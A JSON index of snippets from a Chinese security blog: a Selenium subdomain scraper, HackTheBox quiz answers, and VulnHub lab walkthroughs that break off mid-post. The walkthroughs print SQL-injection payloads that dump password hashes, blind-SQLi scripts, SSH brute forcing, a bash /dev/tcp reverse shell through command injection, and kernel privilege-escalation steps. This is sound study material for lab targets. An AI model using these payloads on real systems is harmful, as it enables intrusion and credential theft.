[ { "title": "使用python-selenium.webdriver库爬取netcraft网站上的域名", "url": "/posts/Misc-%E4%BD%BF%E7%94%A8python-selenium.webdriver%E5%BA%93%E7%88%AC%E5%8F%96netcraft%E7%BD%91%E7%AB%99%E4%B8%8A%E7%9A%84%E5%9F%9F%E5%90%8D/", "categories": "Misc", "tags": "信息收集", "date": "2022-07-17 00:00:00 +0800", "snippet": "剧情 小强最近发现一个可以搜索子域名的网站, 他试着搜索了一下edu.cn, 结果得到了很多 三级域名、四级域名。 小强现在想使用并不熟练的python requests库来爬取网站上的子域名信息。过程中他发现, requests 请求的并不是他想要的内容，网站似乎做了防爬.# cat getsubdomain.py import requestsurl = \"https://searchdns.netcraft.com/\"t1 = requests.get(url)print(t1.text)# python3 getsubdomain.py &gt; 1.html 小强在网上查询了许多资料，且学会了一下东西，接下来跟着小强一步一步操作，帮助小强完成任务.配置操作系统环境 : windows 10浏览器 : Google Chromepython3.9+ 首先下载安装 python 第三方库 seleniumPS C:\\Users\\GameG\\test&gt; pip.exe install selenium不出意外的话应该可以安装成功 配置浏览器相关东西.查看Google Chrome版本Version： 103.0.5060.114在这个网站下载一个小软件，版本就选择和Google Chrome 差不多的.chromedriver.storage.googleapis.com/index.html我选了这这个.下载 chromedriver_win32.zip 文件.将文件解压，把解压后的文件放到 python 的安装目录.C:\\Users\\用户名\\AppData\\Local\\Programs\\Python\\Python310\\然后添加到环境变量。 测试脚本不出意外的话应该可以了from selenium import webdriverfrom selenium.webdriver import ActionChainsfrom selenium.webdriver.common.by import Byimport timedriver = webdriver.Chrome()#driver.implicitly_wait(3)# 要收集的域名domain = \"edu.cn\"driver.get(f\"https://searchdns.netcraft.com/?restriction=site+contains&amp;host={domain}&amp;position=limited\")#a = driver.find_element_by_css_name('result')def main(): a = driver.find_elements(By.CLASS_NAME, 'results-table__host')\t# 保存获取的子域名 f = open('subdomain.txt','a+') for i in a: print(i.text) f.write(i.text+'\\r') f.close() time.sleep(1) driver.execute_script(\"window.scrollTo(0, 1100)\") time.sleep(2) driver.find_element(By.CLASS_NAME,'fa-chevron-circle-right').click()for i in range(100): time.sleep(1) main()" }, { "title": "HackTheBox-Meow", "url": "/posts/HackTheBox-Meow/", "categories": "HackTheBox", "tags": "HackTheBox", "date": "2022-05-23 00:00:00 +0800", "snippet": "任务 1What does the acronym VM stand for?首字母缩略词VM代表什么？FLAG：Virtual Machine任务 2What tool do we use to interact with the operating system in order to issue commands via the command line, such as the one to start our VPN connection? It’s also known as a console or shell.我们用什么工具与操作系统交互，以便通过命令行发出命令，例如启动VPN连接的工具？它也被称为控制台或外壳程序。FLAG:Terminal任务 3What service do we use to form our VPN connection into HTB labs?我们使用什么服务来形成与HTB实验室的VPN连接？FLAG:openvpn任务 4What is the abbreviated name for a ‘tunnel interface’ in the output of your VPN boot-up sequence output?VPN 启动序列输出中“隧道接口”的缩写名称是什么？FLAG:tun任务 5What tool do we use to test our connection to the target with an ICMP echo request?我们使用什么工具来测试与 ICMP 回显请求与目标的连接？FLAG:ping任务 6What is the name of the most common tool for finding open ports on a target?用于查找目标上开放端口的最常用工具的名称是什么？FLAG:nmap任务 7What service do we identify on port 23/tcp during our scans?在扫描期间，我们在端口 23/tcp 上识别什么服务？FLAG:任务 8What username is able to log into the target over telnet with a blank password?哪个用户名能够使用空白密码通过 telnet 登录到目标？FLAG:提交标志Submit root flag提交根标志FLAG:" }, { "title": "VulnHub-VulnOS-2", "url": "/posts/VulnOS-2/", "categories": "vulnhub", "tags": "vulnhub", "date": "2022-03-17 00:00:00 +0800", "snippet": "2022 年 3 月 17 日星期四 VulnOS 是一系列易受攻击的操作系统，打包为虚拟映像，以增强渗透测试技能** 这是版本 2 更小，更少混乱！ 你的任务是对公司网站进行渗透测试，获取系统的根目录并读取最终标志 注意：当前的键盘偏好是“渗透测试是一个广泛的概念”目录 nmap sql注入 提权$ nmap -sV -p- -sC -oN namp 172.16.1.173Nmap scan report for 172.16.1.173Host is up (0.00092s latency).Not shown: 65532 closed portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.6 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 1024 f5:4d:c8:e7:8b:c1:b2:11:95:24:fd:0e:4c:3c:3b:3b (DSA)| 2048 ff:19:33:7a:c1:ee:b5:d0:dc:66:51:da:f0:6e:fc:48 (RSA)| 256 ae:d7:6f:cc:ed:4a:82:8b:e8:66:a5:11:7a:11:5f:86 (ECDSA)|_ 256 71:bc:6b:7b:56:02:a4:8e:ce:1c:8e:a6:1e:3a:37:94 (ED25519)80/tcp open http Apache httpd 2.4.7 ((Ubuntu))|_http-server-header: Apache/2.4.7 (Ubuntu)|_http-title: VulnOSv26667/tcp open irc ngircdMAC Address: 08:00:27:57:4F:AA (Oracle VirtualBox virtual NIC)Service Info: Host: irc.example.net; OS: Linux; CPE: cpe:/o:linux:linux_kernel22 ssh 端口80 web6667 端口不太清楚Web结果一番搜查,在http://172.16.1.173/jabc/?q=node/7发现隐藏信息,背景是黑色的，文字的颜色也是黑色的，如果不是Ctrl + a 我的发现不了得到一个目录，访问/jabcd0cs/http://172.16.1.173/jabcd0cs/在新的页面最下面有一串信息OpenDocMan v1.2.7使用 searchsploit 搜索相关漏洞.# searchsploit OpenDocMan 1.2.7 ------------------------------------------------------------------------------ --------------------------------- Exploit Title | Path------------------------------------------------------------------------------ ---------------------------------OpenDocMan 1.2.7 - Multiple Vulnerabilities | php/webapps/32075.txt------------------------------------------------------------------------------ ---------------------------------找到了一个, 使用 -x 查看内容searchsploit -x php/webapps/32075.txt第一个漏洞，sql注入1) SQL Injection in OpenDocMan: CVE-2014-1945The vulnerability exists due to insufficient validation of \"add_value\" HTTP GET parameter in \"/ajax_udf.php\" script. A remote unauthenticated attacker can execute arbitrary SQL commands in application's database.The exploitation example below displays version of the MySQL server:http://[host]/ajax_udf.php?q=1&amp;add_value=odm_user%20UNION%20SELECT%201,version%28%29,3,4,5,6,7,8,9sql 注入读取服务器本地文件/etc/passwdhttp://172.16.1.173/jabcd0cs/ajax_udf.php?q=1&amp;add_value=odm_user UNION SELECT 1,group_concat(load_file(0x2f6574632f706173737764)),3,4,5,6,7,8,9`竟然可以root:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologinlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologingnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologinlibuuid:x:100:101::/var/lib/libuuid:syslog:x:101:104::/home/syslog:/bin/falsemessagebus:x:102:106::/var/run/dbus:/bin/falselandscape:x:103:109::好像有一个 root 用户查看当前数据库下的表http://172.16.1.173/jabcd0cs/ajax_udf.php?q=1&amp;add_value=odm_user UNION SELECT 1,group_concat(table_name),3,4,5,6,7,8,9 from information_schema.tables where table_schema=database()结果odm_access_log,odm_admin,odm_category,odm_data,odm_department,odm_dept_perms,odm_dept_reviewer,odm_filetypes,odm_log,odm_odmsys,odm_rights,odm_settings,odm_udf,odm_user,odm_user_perms存放用户信息应该在odm_user查看odm_user的字段http://172.16.1.173/jabcd0cs/ajax_udf.php?q=1&amp;add_value=odm_user UNION SELECT 1,group_concat(column_name),3,4,5,6,7,8,9 from information_schema.columns where table_name=0x6f646d5f75736572这里不能直接使用 table_name='odm_user',需要转成16进制id,username,password,department,phone,Email,last_name,first_name,pw_reset_code直接查看 username 和password http://172.16.1.173/jabcd0cs/ajax_udf.php?q=1&amp;add_value=odm_user UNION SELECT 1,group_concat(username,0x5e,password),3,4,5,6,7,8,9 from odm_user一个2个用户，密码应该是md5加密的webmin:b78aae356709f8c31118ea613980954bguest:084e0343a0486ff05530df6c705c8bb4尝试使用 john 破解 MD5加密的密码，将上面的文件放到 hash.txt 文件里使用命令john hash.txt --format=Raw-MD5结果瞬间就出来了uest (guest)webmin1980 (webmin)然后使用 webmin:webmin1980ssh 登录靶机，刚刚查看/etc/passwd 文件的时候并没有发现有webmin用户；然后百度了一下原因：在用户认证这块，并不一定用户信息必须放置在/etc/passwd，比如数据量大的情况下，我可以将相关信息放置在mysql中（当然也可以是其他放置办法），pam可以满足这个要求.37292.c 提权ssh登录系统后$ uname -aLinux VulnOSv2 3.13.0-24-generic #47-Ubuntu SMP Fri May 2 23:31:42 UTC 2014 i686 i686 i686 GNU/Linux使用searchsploit 搜索内核提权的漏洞文件$ searchsploit Linux ubuntu 3.13Linux Kernel 3.13.0 &lt; 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation | linux/local/37292.cKALI:172.16.1.115$ searchsploit -m linux/local/37292.c$ python3 -m http.server 80靶机:提权成功$ wget http://172.16.1.115/37292.c$ gcc 37292.c$ ./a.outspawning threadsmount #1mount #2child threads done/etc/ld.so.preload createdcreating shared library# iduid=0(root) gid=0(root) groups=0(root),1001(webmin)# cd /root# lsflag.txt# cat flag.txtHello and welcome.You successfully compromised the company \"JABC\" and the server completely !!Congratulations !!!Hope you enjoyed it.What do you think of A.I.?# iduid=0(root) gid=0(root) groups=0(root),1001(webmin)# whoamirootEND" }, { "title": "VulnHub-HackthonCTF-2", "url": "/posts/HackthonCTF-2/", "categories": "vulnhub", "tags": "vulnhub", "date": "2022-03-17 00:00:00 +0800", "snippet": "2022 年 3 月 17 日星期四Description 难度：简单 这是面向初学者的基础级 BootToRoot 机器。有两个标志。目录 namp FTP 匿名登录 使用 dirb 对靶机网站子目录爆破 使用hydra对 SSH 服务进行暴力破解 vim 提权namproot@CLw0rm:~/MyDoc/vulnhub/Hackathon2# nmap -sV -p- 172.16.1.163 -sCStarting Nmap 7.91 ( https://nmap.org ) at 2022-03-16 22:31 EDTNmap scan report for 172.16.1.163Host is up (0.0016s latency).Not shown: 65532 closed portsPORT STATE SERVICE VERSION21/tcp open ftp vsftpd 3.0.3| ftp-anon: Anonymous FTP login allowed (FTP code 230)| -rw-r--r-- 1 1000 1000 47 Jun 18 2021 flag1.txt|_-rw-r--r-- 1 1000 1000 849 Jun 19 2021 word.dir| ftp-syst: | STAT: | FTP server status:| Connected to ::ffff:172.16.1.115| Logged in as ftp| TYPE: ASCII| No session bandwidth limit| Session timeout in seconds is 300| Control connection is plain text| Data connections will be plain text| At session startup, client count was 7| vsFTPd 3.0.3 - secure, fast, stable|_End of status80/tcp open http Apache httpd 2.4.41 ((Ubuntu))| http-robots.txt: 1 disallowed entry |_*/|_http-server-header: Apache/2.4.41 (Ubuntu)|_http-title: hackathon27223/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 3072 70:4a:a9:69:c2:d1:68:23:86:bd:85:83:31:ca:80:0c (RSA)| 256 a6:9e:a4:18:ad:a4:2b:7e:ea:f8:5e:63:29:6e:4f:24 (ECDSA)|_ 256 4e:db:a6:d2:eb:b9:53:a5:d7:21:0b:4e:57:a5:f5:c1 (ED25519)MAC Address: 00:0C:29:26:88:AB (VMware)Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 12.52 seconds21端口运行着FTP,并且可以匿名登录，其中有两个文件 flag1.txt 和 word.dir80端口运行着 apache 服务7223端口运行着 ssh 服务FTP 匿名登录ftp 登录用户 anonymous，密码随便root@CLw0rm:~/MyDoc/vulnhub/Hackathon2# ftp 172.16.1.163 # 输入用户名Name (172.16.1.163:root): anonymous# 输入密码Password:# 登录成功230 Login successful.# ls 查看文件ftp&gt; ls-rw-r--r-- 1 1000 1000 47 Jun 18 2021 flag1.txt-rw-r--r-- 1 1000 1000 849 Jun 19 2021 word.dir226 Directory send OK.# 下载 flag1.txtftp&gt; get flag1.txtlocal: flag1.txt remote: flag1.txt200 PORT command successful. Consider using PASV.150 Opening BINARY mode data connection for flag1.txt (47 bytes).226 Transfer complete.47 bytes received in 0.00 secs (310.1246 kB/s)# 下载 word.dir 文件ftp&gt; get word.dirlocal: word.dir remote: word.dir200 PORT command successful. Consider using PASV.150 Opening BINARY mode data connection for word.dir (849 bytes).226 Transfer complete.849 bytes received in 0.01 secs (84.3526 kB/s)# 退出登录ftp&gt; exit221 Goodbye.# 已经下载到本地root@CLw0rm:~/MyDoc/vulnhub/Hackathon2# lsflag1.txt word.dirroot@CLw0rm:~/MyDoc/vulnhub/Hackathon2#查看flag1.txt ，成功得到第一个flag$ cat flag1.txt ₣Ⱡ₳₲{7e3c118631b68d159d9399bda66fc684}使用 dirb 对靶机网站子目录爆破除了 flag1.txt 文件 还有一个 word.dir 文件看到文件名字，我就感觉应该是爆破服务器web网站的字典文件使用dirb 工具对靶机网站子目录收集 字典就使用 word.dir$ dirb http://172.16.1.163 ./word.dir结果,有一个happy 页面---- Scanning URL: http://172.16.1.163/ ----+ http://172.16.1.163/happy (CODE:200|SIZE:110)直接使用curl查看# curl http://172.16.1.163/happy&lt;html&gt;&lt;title&gt;happy&lt;/title&gt;&lt;body&gt;&lt;h1&gt; Nothing is in here&lt;/h1&gt;&lt;/body&gt;&lt;!-- username: hackathonll &gt;&lt;/html&gt; username: hackathonll得到一个用户名 hackathonll使用hydra对 SSH 服务进行暴力破解使用得到得用户名和在ftp得到的字典 对运行在7223端口的SSH 进行暴力破解-s 7223指定端口结果$ hydra -l hackathonll -P word.dir ssh://172.16.1.163 -s 7223[7223][ssh] host: 172.16.1.163 login: hackathonll password: Ti@gOhackatonll 的密码是 Ti@gO直接ssh 登录$ ssh hackathonll@172.16.1.163 -p 7223The authenticity of host '[172.16.1.163]:7223 ([172.16.1.163]:7223)' can't be established.ECDSA key fingerprint is SHA256:3Q0cBP5iJzbltBIW6jPQ+lJRQal0IGi6hqIRc2GAzgs.Are you sure you want to continue connecting (yes/no/[fingerprint])? yesWarning: Permanently added '[172.16.1.163]:7223' (ECDSA) to the list of known hosts.hackathonll@172.16.1.163's password: Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-74-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Thu 17 Mar 2022 06:34:17 AM UTC System load: 0.02 Processes: 222 Usage of /: 24.3% of 18.57GB Users logged in: 0 Memory usage: 20% IPv4 address for ens33: 172.16.1.163 Swap usage: 0%67 updates can be installed immediately.0 of these updates are security updates.To see these additional updates run: apt list --upgradableThe list of available updates is more than a week old.To check for new updates run: sudo apt updateLast login: Sat Jun 19 05:35:15 2021 from 10.0.0.110vim 提权$ sudo -lMatching Defaults entries for hackathonll on hackathon: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser hackathonll may run the following commands on hackathon: (root) NOPASSWD: /usr/bin/vim$vim 提取sudo /usr/bin/vim 1:!/bin/bashroot@hackathon:/home/hackathonll# iduid=0(root) gid=0(root) groups=0(root)root@hackathon:/home/hackathonll# cd /rootroot@hackathon:~# lsflag2.txt snaproot@hackathon:~# cat flag2.txt ₣Ⱡ₳₲{7e3c118631b68d159d9399bda66fc694}root@hackathon:~#" }, { "title": "VulnHub-Kioptrix Level 1.1", "url": "/posts/Kioptrix-Level-1.1/", "categories": "vulnhub", "tags": "vulnhub", "date": "2022-03-16 00:00:00 +0800", "snippet": "2022 年 3 月 16 日，星期三Description目录 nmap 使用 sqlmap 对登录页面进行注入攻击 后台存的命令执行漏洞,进行利用/反弹Shell Privilege Escalation(特权升级)nmap 扫描# Nmap 7.91 scan initiated Wed Mar 16 04:41:50 2022 as: nmap -sC -sV -p- -oN nmap 172.16.1.138Nmap scan report for 172.16.1.138Host is up (0.0031s latency).Not shown: 65528 closed portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 3.9p1 (protocol 1.99)| ssh-hostkey: | 1024 8f:3e:8b:1e:58:63:fe:cf:27:a3:18:09:3b:52:cf:72 (RSA1)| 1024 34:6b:45:3d:ba:ce:ca:b2:53:55:ef:1e:43:70:38:36 (DSA)|_ 1024 68:4d:8c:bb:b6:5a:bd:79:71:b8:71:47:ea:00:42:61 (RSA)|_sshv1: Server supports SSHv180/tcp open http Apache httpd 2.0.52 ((CentOS))|_http-server-header: Apache/2.0.52 (CentOS)|_http-title: Site doesn't have a title (text/html; charset=UTF-8).111/tcp open rpcbind 2 (RPC #100000)| rpcinfo: | program version port/proto service| 100000 2 111/tcp rpcbind| 100000 2 111/udp rpcbind| 100024 1 606/udp status|_ 100024 1 609/tcp status443/tcp open ssl/https?| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--| Not valid before: 2009-10-08T00:10:47|_Not valid after: 2010-10-08T00:10:47|_ssl-date: 2022-03-16T05:32:36+00:00; -3h09m37s from scanner time.| sslv2: | SSLv2 supported| ciphers: | SSL2_RC2_128_CBC_WITH_MD5| SSL2_RC2_128_CBC_EXPORT40_WITH_MD5| SSL2_RC4_128_WITH_MD5| SSL2_RC4_64_WITH_MD5| SSL2_RC4_128_EXPORT40_WITH_MD5| SSL2_DES_192_EDE3_CBC_WITH_MD5|_ SSL2_DES_64_CBC_WITH_MD5609/tcp open status 1 (RPC #100024)631/tcp open ipp CUPS 1.1| http-methods: |_ Potentially risky methods: PUT|_http-server-header: CUPS/1.1|_http-title: 403 Forbidden3306/tcp open mysql MySQL (unauthorized)MAC Address: 00:0C:29:D6:1F:E5 (VMware)Host script results:|_clock-skew: -3h09m37sService detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Wed Mar 16 04:42:13 2022 -- 1 IP address (1 host up) scanned in 22.62 seconds先去看看我比较熟悉的 80 端口访问 web 发现是一个 远程系统管理登录 页面.这里我可以想到两种攻击方式。1: 登录页面肯存在 sql 注入2 : 一般后台登录用户名都为admin，可以尝试暴力破解密码使用 sqlmap 对登录页面进行注入攻击’ or 1=’1可以使用万能用户 万能密码 登录成功但是呢我们需要 利用sql注入查询数据库内容sqlmap -u \"http://172.16.1.138/index.php\" --batch --forms --risk 3 –forms 对于一个页面的form表单中的数据进行注入测试–risk 加大测试等级输出结果，确认存在sql注入Parameter: psw (POST) Type: boolean-based blind Title: OR boolean-based blind - WHERE or HAVING clause Payload: uname=nTdT&amp;psw=-1424' OR 3522=3522 AND 'jYxS'='jYxS&amp;btnLogin=Login Type: time-based blind Title: MySQL &lt; 5.0.12 AND time-based blind (heavy query) Payload: uname=nTdT&amp;psw=' AND 5438=BENCHMARK(5000000,MD5(0x6b777477)) AND 'KIwJ'='KIwJ&amp;btnLogin=Login---do you want to exploit this SQL injection? [Y/n] Y[07:33:56] [INFO] the back-end DBMS is MySQLweb server operating system: Linux CentOS 4web application technology: Apache 2.0.52, PHP 4.3.9back-end DBMS: MySQL &lt; 5.0.12[07:33:56] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/root/.local/share/sqlmap/output/results-03162022_0733am.csv'[07:33:56] [WARNING] your sqlmap version is outdated[*] ending @ 07:33:56 /2022-03-16/查询数据库sqlmap -u \"http://172.16.1.138/index.php\" --batch --forms --risk 3 --dbs`输出结果就一个数据库available databases [1]:[*] webapp查询webapp 库里的表sqlmap -u \"http://172.16.1.138/index.php\" --batch --forms --risk 3 -D --tables直接错误，可能是因为不存在 information_schema 数据库的原因sqlmap 也对这种情况有相应对策，这里我不想展示怎么使用。使用python编写注入脚本为了提高我编写自动化脚本的能力，我写了对应的脚本 进行解决 查询 webapp 数据库内有哪些表```pythonimport requestsurl = ‘http://172.16.1.138/index.php’def main(tables): payload = f”-1’ or exists(select 1 from webapp.{tables}) or 2=’2” data={ ‘uname’:’admin’ ,’psw’: payload ,’btnLogin’:’Login’ } v1 = requests.post(url=url,data=data).text if ‘Ping a Machine on’ in v1: print(tables)with open(‘/usr/share/sqlmap/data/txt/common-columns.txt’,’r’) as f: for l in f.readlines(): main(l[:-1])执行脚本```bashroot@CLw0rm:~/MyDoc/vulnhub/Kioptrix-1.1# python3 exp.py usersroot@CLw0rm:~/MyDoc/vulnhub/Kioptrix-1.1#获取了一个 users 表 想查询表的内容我们同样写个脚本跑一下(只需要把上面的脚本稍做修改)查询users 表里有哪些字段```pythonimport requestsurl = ‘http://172.16.1.138/index.php’def main(columns): payload = f”-1’ or exists(select {columns} from webapp.users) or 2=’2” data={ ‘uname’:’admin’ ,’psw’: payload ,’btnLogin’:’Login’ } v1 = requests.post(url=url,data=data).text if ‘Ping a Machine on’ in v1: print(columns)with open(‘/usr/share/sqlmap/data/txt/common-columns.txt’,’r’) as f: for l in f.readlines(): main(l[:-1])脚本直接结果```bashoot@CLw0rm:~/MyDoc/vulnhub/Kioptrix-1.1# python3 exp.py idusernamepassword获取了3个 字段 id,username,password继续编写脚本查看字段所用内容 查询 id,username,password 字段的内容脚本import requestsurl = 'http://172.16.1.138/index.php'def main(): content = '' for i in range(1,200): low = 32 high = 127 mid = (low + high) // 2 while(low &lt; high): payload = f\"' or ascii(substr((select group_concat(id,'-',username,'-',password) from users),{i},1))&gt;{mid} and 1='1\" data={ 'uname':'admin' ,'psw': payload ,'btnLogin':'Login' } v1 = requests.post(url=url,data=data).text if 'Ping a Machine on' in v1: low = mid + 1 else: high = mid mid = (low + high)//2 if mid == 127 or mid == 32: break content += chr(mid) print(content)main()执行结果root@CLw0rm:~/MyDoc/vulnhub/Kioptrix-1.1# python3 exp.py 11-1-a1-ad1-adm1-admi1-admin1-admin-1-admin-51-admin-5a1-admin-5af1-admin-5afa1-admin-5afac1-admin-5afac81-admin-5afac8d1-admin-5afac8d81-admin-5afac8d851-admin-5afac8d85f1-admin-5afac8d85f,1-admin-5afac8d85f,21-admin-5afac8d85f,2-1-admin-5afac8d85f,2-j1-admin-5afac8d85f,2-jo1-admin-5afac8d85f,2-joh1-admin-5afac8d85f,2-john1-admin-5afac8d85f,2-john-1-admin-5afac8d85f,2-john-61-admin-5afac8d85f,2-john-661-admin-5afac8d85f,2-john-66l1-admin-5afac8d85f,2-john-66la1-admin-5afac8d85f,2-john-66laj1-admin-5afac8d85f,2-john-66lajG1-admin-5afac8d85f,2-john-66lajGG1-admin-5afac8d85f,2-john-66lajGGb1-admin-5afac8d85f,2-john-66lajGGbl1-admin-5afac8d85f,2-john-66lajGGblaroot@CLw0rm:~/MyDoc/vulnhub/Kioptrix-1.1#一共 2 个用户admin:5afac8d85fjohn:66lajGGbla直接登录后台后台存的命令执行漏洞,进行利用/反弹Shell登录后，查看源代码&lt;html&gt;&lt;body&gt;&lt;!-- Start of HTML when logged in as Administator --&gt;\t&lt;form name=\"ping\" action=\"pingit.php\" method=\"post\" target=\"_blank\"&gt;\t\t&lt;table width='600' border='1'&gt;\t\t&lt;tr valign='middle'&gt;\t\t\t&lt;td colspan='2' align='center'&gt;\t\t\t&lt;b&gt;Welcome to the Basic Administrative Web Console&lt;br&gt;&lt;/b&gt;\t\t\t&lt;/td&gt;\t\t&lt;/tr&gt;\t\t&lt;tr valign='middle'&gt;\t\t\t&lt;td align='center'&gt;\t\t\t\tPing a Machine on the Network:\t\t\t&lt;/td&gt;\t\t\t\t&lt;td align='center&gt;\t\t\t\t&lt;input type=\"text\" name=\"ip\" size=\"30\"&gt;\t\t\t\t&lt;input type=\"submit\" value=\"submit\" name=\"submit\"&gt;\t\t\t&lt;/td&gt;\t\t\t&lt;/td&gt;\t\t&lt;/tr&gt;\t&lt;/table&gt;\t&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;发现可以对pingit.php进行 post 提交 ip,貌似是服务器对提交ip内容进行 ping 的操作使用curl命令 对 pingit.php页面 发起 POST 请求，提交ip=127.0.0.1&amp;submit=submitroot@CLw0rm:~/MyDoc/vulnhub/Kioptrix-1.1# curl 'http://172.16.1.138/pingit.php' -XPOST -d 'ip=127.0.0.1&amp;submit=submit'127.0.0.1&lt;pre&gt;PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.64 bytes from 127.0.0.1: icmp_seq=0 ttl=64 time=0.012 ms64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.019 ms64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.016 ms--- 127.0.0.1 ping statistics ---3 packets transmitted, 3 received, 0% packet loss, time 1998msrtt min/avg/max/mdev = 0.012/0.015/0.019/0.005 ms, pipe 2等待返回结果，意料之中接下来直接反弹shellkali nc 监听本地1234端口: ip 172.16.1.115 nc -lvp 1234然后新开个终端，使用curl 发送payload curl 'http://172.16.1.138/pingit.php' -XPOST -d 'ip=127.0.0.1|bash -i &gt;%26 /dev/tcp/172.16.1.115/1234 0&gt;%261&amp;submit=submit'然后监听的那边已经接受到一个shell了root@CLw0rm:~/MyDoc/vulnhub/Kioptrix-1.1# nc -lvp 1234Ncat: Version 7.91 ( https://nmap.org/ncat )Ncat: Listening on :::1234Ncat: Listening on 0.0.0.0:1234Ncat: Connection from 172.16.1.138.Ncat: Connection from 172.16.1.138:32780.bash: no job control in this shellbash-3.00$ which python/usr/bin/pythonbash-3.00$ python -c \"import pty;pty.spawn('/bin/bash')\"bash-3.00$ ttytty/dev/pts/0bash-3.00$cat /etc/passwd |grep bin/bash 发现 john 用户 ，刚刚在 数据库里也有个 john 还有密码bash-3.00$ cat /etc/passwd |grep bin/bashcat /etc/passwd |grep bin/bashroot:x:0:0:root:/root:/bin/bashnetdump:x:34:34:Network Crash Dump user:/var/crash:/bin/bashmysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/bashjohn:x:500:500::/home/john:/bin/bashharold:x:501:501::/home/harold:/bin/bashbash-3.00$尝试使用数据库里密码su 切换到用户john, 或者ssh登录尝试的结果都失败Privilege Escalation(特权升级)bash-3.00$ uname -auname -aLinux kioptrix.level2 2.6.9-55.EL #1 Wed May 2 13:52:16 EDT 2007 i686 i686 i386 GNU/Linuxbash-3.00$ cat /proc/versionLinux version 2.6.9-55.EL (mockbuild@builder6.centos.org) (gcc version 3.4.6 20060404 (Red Hat 3.4.6-8)) #1 Wed May 2 13:52:16 EDT 2007使用 searchsploit 搜索潜在的本地漏洞root@CLw0rm:~/MyDoc/vulnhub/Kioptrix-1.1# searchsploit 2.6 Linux Kernel Local Privilege Centos------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------Linux Kernel 2.4.x/2.6.x (CentOS 4.8/5.3 / RHEL 4.8/5.3 / SuSE 10 SP2/11 / Ubuntu 8.10) (PPC) - 'sock_sendpage()' Local Privilege Escalati | linux/local/9545.cLinux Kernel 2.4/2.6 (RedHat Linux 9 / Fedora Core 4 &lt; 11 / Whitebox 4 / CentOS 4) - 'sock_sendpage()' Ring0 Privilege Escalation (5) | linux/local/9479.cLinux Kernel 2.6 &lt; 2.6.19 (White Box 4 / CentOS 4.4/4.5 / Fedora Core 4/5/6 x86) - 'ip_append_data()' Ring0 Privilege Escalation (1) | linux_x86/local/9542.cLinux Kernel 2.6.32 &lt; 3.x (CentOS 5/6) - 'PERF_EVENTS' Local Privilege Escalation (1) | linux/local/25444.cLinux Kernel 2.6.x / 3.10.x / 4.14.x (RedHat / Debian / CentOS) (x64) - 'Mutagen Astronomy' Local Privilege Escalation | linux_x86-64/local/45516.c------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------Shellcodes: No Resultsroot@CLw0rm:~/MyDoc/vulnhub/Kioptrix-1.1#先尝试 第一个 linux/local/9545.cKALI:将9545.c拷贝到当前目录searchsploit -m linux/local/9545.c开启 http 服务，方便 靶机下载提取文件python3 -m http.server 81靶机:$ cd /tmp# 下载 提权文件$ wget http://172.16.1.115:81/9545.c# 看看编译说明$ cat 9545.c |grep gcc * gcc -Wall -o linux-sendpage linux-sendpage.c * gcc -Wall -m64 -o linux-sendpage linux-sendpage.c# 先修改下文件名$ mv 9545.c linux-sendpage.c# 使用上面第一条编译命令$ gcc -Wall -o linux-sendpage linux-sendpage.c执行文件，提权成功$ ./linux-sendpagesh-3.00# ididuid=0(root) gid=0(root) groups=48(apache)sh-3.00# cd /rootcd /rootsh-3.00# lslsanaconda-ks.cfg install.log install.log.syslogsh-3.00# whoamiwhoamirootsh-3.00#结束" }, { "title": "VulnHub-DC-4", "url": "/posts/Vulnhub-DC-4/", "categories": "vulnhub", "tags": "vulnhub", "date": "2022-03-15 00:00:00 +0800", "snippet": "2022 年 3 月 15 日，星期二Description aTable of Content namp 使用Hydra暴力破解HTTP Post Login POST 提交的命令参数可控，利用 nc 反弹 shell 使用 Hydra 暴力破解 ssh 密码 使用 nc 传输文件 普通用户可以root 的身份运行 /usr/bin/teehee 进行提权nmap# Nmap 7.70 scan initiated Mon Mar 14 19:22:23 2022 as: nmap -sV -p- -sC -oN nmap 172.16.1.144Nmap scan report for 172.16.1.144Host is up (0.0024s latency).Not shown: 65533 closed portsPORT STATE 